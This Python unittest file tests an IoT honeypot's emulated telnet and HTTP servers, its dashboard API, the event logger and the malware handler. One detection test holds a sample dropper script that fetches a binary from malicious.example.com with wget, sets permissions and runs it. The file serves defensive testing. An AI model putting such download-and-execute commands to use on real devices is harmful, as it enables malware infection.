#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Test script for the IoT Honeypot.
Validates all components and their integration.
"""

import os
import sys
import time
import socket
import logging
import requests
import threading
import unittest
from typing import Dict, Any, List, Optional

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import core modules
from .core.config import get_config_manager
from .core.logger import get_event_logger
from .core.devices import get_device_profile_manager

# Import protocol handlers
from .protocols.telnet import start_telnet_server
from .protocols.http import start_http_server

# Import dashboard
from .dashboard.server import start_dashboard

# Import security
from .security.malware import get_malware_handler

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

logger = logging.getLogger("honeypot.test")

class HoneypotTest(unittest.TestCase):
    """Test cases for the IoT Honeypot."""
    
    @classmethod
    def setUpClass(cls):
        """Set up test environment."""
        # Create necessary directories
        os.makedirs("logs", exist_ok=True)
        os.makedirs("data", exist_ok=True)
        os.makedirs("captures", exist_ok=True)
        
        # Initialize components
        cls.config_manager = get_config_manager()
        cls.event_logger = get_event_logger()
        cls.device_manager = get_device_profile_manager()
        cls.malware_handler = get_malware_handler()
        
        # Start services in separate threads
        cls.threads = []
        cls.running = True
        
        # Use test ports to avoid conflicts
        cls.telnet_port = 2323
        cls.http_port = 8081
        cls.dashboard_port = 8082
        
        # Start Telnet server
        telnet_thread = threading.Thread(
            target=start_telnet_server,
            args=(cls.telnet_port, "router")
        )
        telnet_thread.daemon = True
        telnet_thread.start()
        cls.threads.append(telnet_thread)
        
        # Start HTTP server
        http_thread = threading.Thread(
            target=start_http_server,
            args=(cls.http_port, "router")
        )
        http_thread.daemon = True
        http_thread.start()
        cls.threads.append(http_thread)
        
        # Start dashboard
        dashboard_thread = threading.Thread(
            target=start_dashboard,
            args=(cls.dashboard_port,)
        )
        dashboard_thread.daemon = True
        dashboard_thread.start()
        cls.threads.append(dashboard_thread)
        
        # Wait for services to start
        time.sleep(2)
    
    @classmethod
    def tearDownClass(cls):
        """Clean up after tests."""
        cls.running = False
        
        # Wait for threads to finish
        for thread in cls.threads:
            if thread.is_alive():
                thread.join(timeout=1)
    
    def test_config_manager(self):
        """Test configuration manager."""
        # Test getting protocol config
        telnet_config = self.config_manager.get_protocol_config("telnet")
        self.assertIsInstance(telnet_config, dict)
        self.assertIn("port", telnet_config)
        
        # Test getting device config
        router_config = self.config_manager.get_device_config("router")
        self.assertIsInstance(router_config, dict)
        self.assertEqual(router_config["type"], "router")
    
    def test_event_logger(self):
        """Test event logger."""
        # Test logging events
        self.event_logger.log_event("test_event", "127.0.0.1", "test", {"test": "data"})
        self.event_logger.log_attack("test_attack", "127.0.0.1", "test", {"test": "data"})
        
        # Test getting recent events
        events = self.event_logger.get_recent_events()
        self.assertIsInstance(events, list)
        self.assertGreater(len(events), 0)
    
    def test_device_manager(self):
        """Test device profile manager."""
        # Test getting device profiles
        router_profile = self.device_manager.get_device_profile("router")
        self.assertIsInstance(router_profile, dict)
        self.assertEqual(router_profile["type"], "router")
        
        # Test getting command responses
        response = self.device_manager.get_command_response("router", "help")
        self.assertIsInstance(response, str)
        self.assertIn("Available commands", response)
        
        # Test authentication
        result = self.device_manager.authenticate("router", "telnet", "admin", "admin")
        self.assertTrue(result)
        
        result = self.device_manager.authenticate("router", "telnet", "admin", "wrong")
        self.assertFalse(result)
    
    def test_malware_handler(self):
        """Test malware handler."""
        # Test malware detection
        test_data = b"""#!/bin/sh
wget http://malicious.example.com/malware.bin
chmod 777 malware.bin
./malware.bin
"""
        
        result = self.malware_handler.detect_malware(test_data)
        self.assertTrue(result)
        
        # Test file capture
        file_hash = self.malware_handler.capture_file(test_data, "127.0.0.1", "test")
        self.assertIsNotNone(file_hash)
        
        # Test file analysis
        analysis = self.malware_handler.analyze_file(file_hash)
        self.assertIsInstance(analysis, dict)
        self.assertEqual(analysis["file_hash"], file_hash)
        
        # Test getting captured files
        files = self.malware_handler.get_captured_files()
        self.assertIsInstance(files, list)
        self.assertGreater(len(files), 0)
    
    def test_telnet_server(self):
        """Test Telnet server."""
        # Connect to Telnet server
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(5)
            client.connect(("localhost", self.telnet_port))
            
            # Receive banner
            data = client.recv(1024)
            self.assertIn(b"Welcome to", data)
            
            # Send username
            client.sendall(b"admin\r\n")
            
            # Receive password prompt
            data = client.recv(1024)
            self.assertIn(b"Password", data)
            
            # Send password
            client.sendall(b"admin\r\n")
            
            # Receive login success
            data = client.recv(1024)
            self.assertIn(b"Login successful", data)
            
            # Send command
            client.sendall(b"help\r\n")
            
            # Receive command response
            data = client.recv(1024)
            self.assertIn(b"Available commands", data)
            
            # Close connection
            client.close()
        except Exception as e:
            self.fail(f"Telnet server test failed: {e}")
    
    def test_http_server(self):
        """Test HTTP server."""
        # Connect to HTTP server
        try:
            response = requests.get(f"http://localhost:{self.http_port}/")
            
            # Check response
            self.assertEqual(response.status_code, 200)
            self.assertIn("Login", response.text)
            
            # Test login form
            response = requests.post(
                f"http://localhost:{self.http_port}/login.cgi",
                data={"username": "admin", "password": "admin"}
            )
            
            # Check redirect
            self.assertEqual(response.status_code, 302)
            self.assertIn("/index.html", response.headers.get("Location", ""))
        except Exception as e:
            self.fail(f"HTTP server test failed: {e}")
    
    def test_dashboard(self):
        """Test dashboard."""
        # Connect to dashboard
        try:
            response = requests.get(f"http://localhost:{self.dashboard_port}/")
            
            # Check response
            self.assertEqual(response.status_code, 200)
            self.assertIn("IoT Honeypot Dashboard", response.text)
            
            # Test API endpoints
            endpoints = ["/api/stats", "/api/events", "/api/attacks", 
                         "/api/credentials", "/api/commands", "/api/geo"]
            
            for endpoint in endpoints:
                response = requests.get(f"http://localhost:{self.dashboard_port}{endpoint}")
                self.assertEqual(response.status_code, 200)
                self.assertIsInstance(response.json(), (dict, list))
        except Exception as e:
            self.fail(f"Dashboard test failed: {e}")
    
    def test_integration(self):
        """Test integration between components."""
        # Generate some events
        self.event_logger.log_event("connection", "192.168.1.100", "telnet", {"port": 23})
        self.event_logger.log_event("login_attempt", "192.168.1.100", "telnet", 
                                    {"username": "admin", "password": "password123"})
        self.event_logger.log_attack("brute_force", "192.168.1.100", "telnet", 
                                    {"attempts": 5, "last_username": "root"})
        
        # Check if events appear in dashboard
        try:
            response = requests.get(f"http://localhost:{self.dashboard_port}/api/events")
            events = response.json()
            
            # Find our test events
            found_connection = False
            found_login = False
            found_attack = False
            
            for event in events:
                if event.get("event_type") == "connection" and event.get("source_ip") == "192.168.1.100":
                    found_connection = True
                elif event.get("event_type") == "login_attempt" and event.get("source_ip") == "192.168.1.100":
                    found_login = True
                elif event.get("type") == "attack" and event.get("source_ip") == "192.168.1.100":
                    found_attack = True
            
            self.assertTrue(found_connection, "Connection event not found in dashboard")
            self.assertTrue(found_login, "Login attempt event not found in dashboard")
            self.assertTrue(found_attack, "Attack event not found in dashboard")
        except Exception as e:
            self.fail(f"Integration test failed: {e}")

if __name__ == "__main__":
    unittest.main()
